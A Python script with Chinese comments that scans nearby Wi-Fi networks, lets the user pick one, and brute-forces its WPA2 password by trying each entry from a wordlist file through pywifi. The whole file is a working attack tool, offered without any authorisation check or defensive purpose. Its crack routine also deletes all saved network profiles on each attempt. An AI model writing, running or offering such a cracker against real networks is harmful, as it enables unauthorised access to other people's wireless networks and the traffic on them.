__author__ = 'ximenxiaoxue'

import sys #进行错误检查
import random #快速排序使用
import time
import pywifi 
from pywifi import const,Profile

# 功能：
#1.判断自身是否连接到wifi
#2.选择是否进行wifi密码破解，新建一个函数进行选择
#3.进行破解


class wifi_attack_main():

    def __init__(self):  #这个是整个程序的入口，看这个函数的步骤就可以分析整个程序的流程了

        self.wifi = pywifi.PyWiFi() #创建wifi对象
        self.iface = self.wifi.interfaces()[0] #获取第一个无线网卡
        self.wifi_status = self.iface.status()#获取无线网卡状态

        self.choice = self.Choice() #选择是否进行wifi密码破解
        self.wifi_attack(self.choice) #进行wifi攻击

    def wifi_attack(self,choice):
        if choice == True:
            item_dict = self.wifi_scan() #扫描wifi
            count,singnal_list = self.read_wifi_data(item_dict)#读取wifi数据
            wifi_name_attack = self.wifi_attack_choose(count,singnal_list) #选择需要破解的wifi

            self.wifi_crack(wifi_name_attack) #破解wifi密码
        else:
            print("已退出")

            num = input("按任意键退出")

        pass


    def wifi_scan(self):
        #扫描wifi
        print("正在扫描wifi..."+ "\n")

        time.sleep(2) #不休眠扫描不全

        try:
            self.iface.scan()  # 扫描附近的wifi

            while not self.iface.scan_results():
                print("正在扫描...")
        except:
               sys.exit("扫描失败，请检查网络连接")
        print("扫描完成")
        num = 0

        wifi_list_parameter = {'SSID': [], 'Singnal level': [], 'BSSID': [], 'Frequency': []}
        for bss in self.iface.scan_results():
            num += 1
            # print("SSID: %s" % bss.ssid)  # wifi名称
            # print("Singnal level: %s" % bss.signal)  # 信号强度,信号强度是负数，越接近0网络强度越好
            # print("BSSID: %s" % bss.bssid)  # MAC地址
            # # print("Encryption: %s" % bss.encryption)
            # print("Frequency: %s" % bss.freq)  # 频率 2472000为2.4G网络，5745000为5G网络
            # print("=" * 20)
            #
            wifi_list_parameter['SSID'].append(bss.ssid)
            wifi_list_parameter['Singnal level'].append(bss.signal)
            wifi_list_parameter['BSSID'].append(bss.bssid)
            wifi_list_parameter['Frequency'].append(bss.freq)

        print("\n"+"*" * 20)
        print("共扫描到%d个wifi" % (num-1)) #不知道为啥pywifi会多扫描一个，所以-1
        print("*" * 20 + "\n")

        #print(wifi_list_parameter)
        return wifi_list_parameter

    def Choice(self):#选择是否进行wifi密码破解

        print("请保证网络开关已打开"+ "\n")
        #time.sleep(3)
        if self.wifi_status == const.IFACE_DISCONNECTED:  # 判断无线网卡是否连接

            print("网络未连接")
        else:
            print("网络已连接")

        while True:#循环选择是否进行wifi密码破解
            choose_2 = input("是否进行wifi密码破解程序？(y/n):")

            if choose_2 == "y" or choose_2 == "yes":
                print("执行破解程序......")
                choice = True
                return choice
            elif choose_2 == "n" or choose_2 == "no":
                print("正在退出程序")
                choice = False
                return choice

            else:
                print("输入错误，请重新输入")
                continue



    def read_wifi_data(self,item_dict):#读取wifi数据，传入的item_dict为字典类型，包含wifi信息
        #{'SSID': {'MERCURY_9CEE', 'szpjwfhm_5G', 'szpjwfhm', 'CMCC-5Z94'}, 'Singnal level': {-71, -70, -59, -83}, 'BSSID': {'cc:2d:21:e5:cc:b1:', 'cc:2d:21:e5:cc:b5:', '6c:59:40:7e:9c:ee:', 'ec:6c:b5:ea:3f:28:'}, 'Frequency': {2417000, 2472000, 5745000, 2447000}}


        print("\n" + "正在处理数据...")
        #将信号强度列表进行排序
        wifi_list = self.indexed_quicksort(item_dict['Singnal level'])
        print("排序完成" + "\n")
        print("=" * 20)

        #读取wifi数据
        print("正在读取wifi数据...")
        print("=" * 20 + "\n")

        num = 0
        wifi_signal_list = []

        for i in range(len(wifi_list)):
            num += 1
            print("正在读取第%d个wifi数据..." % (num))
            print("WiFi编号：%d" % (num))
            print("名称：%s" % item_dict['SSID'][wifi_list[i]])
            print("MAC地址：%s" % item_dict['BSSID'][wifi_list[i]])
            print("频率：%s" % item_dict['Frequency'][wifi_list[i]])
            print("信号强度：%s" % item_dict['Singnal level'][wifi_list[i]])
            print("=" * 20)

            wifi_signal_list.append(item_dict['SSID'][wifi_list[i]])
        print("\n"+"读取完成")
        #print(wifi_signal_list)
        print("\n"+"*" * 20)
        return i,wifi_signal_list

    def wifi_attack_choose(self,count,singnal_list):#选择需要破解的wifi

        while True:
            # 选择需要破解的wifi
            choose_wifi = int(input("请输入需要破解的wifi的编号：")) - 1
            if choose_wifi < 0 or choose_wifi > count:
                print("输入错误，请重新输入")
                continue
            else:
                break


        wifi_name_attack = singnal_list[choose_wifi]
        print("正在破解wifi：%s" % wifi_name_attack)

        return wifi_name_attack



    def wifi_crack(self,wifi_name_attack):#破解wifi密码
        print("正在破解wifi密码...")
        # 读取字典文件
        # 字典文件格式：text

        path = "wifi_password.txt"
        with open(path, "r") as f:
            data = f.read()
            data = data.split("\n")
            for try_password in data:

                #print(line)

                profile = Profile()
                profile.ssid = wifi_name_attack  # wifi名称

                # 网卡开放状态
                # "Auth - AP" 验证算法
                profile.auth = const.AUTH_ALG_OPEN

                # WiFi的加密算法为"WPA"
                # 选择WiFi加密算法
                # "Akm - AP" 的密钥管理
                profile.akm.append(const.AKM_TYPE_WPA2PSK)

                # 加密单元
                # "Cipher - AP" 密码类型
                profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元

                # 设置密码
                profile.key = try_password  # wifi密码

                self.iface.remove_all_network_profiles()  # 删除所有wifi配置文件

                self.iface.add_network_profile(profile)  # 添加wifi配置文件

                self.iface.connect(profile)  # 连接wifi
                time.sleep(1) #等待连接,这个可以防止连接过快导致无法连接

                if self.iface.status() == const.IFACE_CONNECTED:
                    print("密码: %s 校验成功" % try_password)
                else:
                    print("密码: %s 校验失败" % try_password)

    def indexed_quicksort(self, array):
        # 创建一个包含 (值, 原始索引) 的列表
        arr_with_index = [(value, index) for index, value in enumerate(array)]

        # 快速排序函数，对 arr_with_index 进行排序
        def quicksort(arr):
            if len(arr) <= 1:
                return arr
            else:
                # 随机选择基准元素
                pivot_index = random.randint(0, len(arr) - 1)
                pivot = arr[pivot_index][0]
                left = []  # 小于基准的元素
                right = []  # 大于基准的元素
                middle = []  # 等于基准的元素

                for value, original_index in arr:
                    if value < pivot:
                        left.append((value, original_index))
                    elif value > pivot:
                        right.append((value, original_index))
                    else:
                        middle.append((value, original_index))

                return quicksort(right) + middle + quicksort(left)  # 将较大的元素放在前面

        # 执行快速排序
        sorted_arr_with_index = quicksort(arr_with_index)

        # 提取排序后的值和原始索引
        #sorted_values = [value for value, _ in sorted_arr_with_index]  # 获取排序后的值
        sorted_original_indices = [index for _, index in sorted_arr_with_index]  # 获取排序后的值的原始索引，用来匹配WiFi的信息
        #print(sorted_original_indices)

        return sorted_original_indices


if __name__ == '__main__':
    wifi_attack = wifi_attack_main()


